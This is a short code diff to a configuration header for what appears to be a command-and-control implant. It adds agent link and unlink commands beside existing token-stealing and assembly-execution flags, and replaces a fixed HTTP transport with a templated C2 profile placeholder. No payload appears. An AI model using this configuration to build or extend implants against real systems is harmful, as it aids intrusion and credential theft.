@@ -71,6 +71,8 @@
 #define INCLUDE_CMD_STEAL_TOKEN
 #define INCLUDE_CMD_STATUS
 #define INCLUDE_CMD_EXECUTE_ASSEMBLY
+#define INCLUDE_CMD_LINK
+#define INCLUDE_CMD_UNLINK
 
 #else //_MANUAL
 
@@ -81,7 +83,7 @@
 /*
     General settings
 */
-#define HTTPX_TRANSPORT
+#define %C2_PROFILE%
 
 #define S_GET_USERAGENT     "%S_GET_USERAGENT%"
 #define S_POST_USERAGENT    "%S_POST_USERAGENT%"
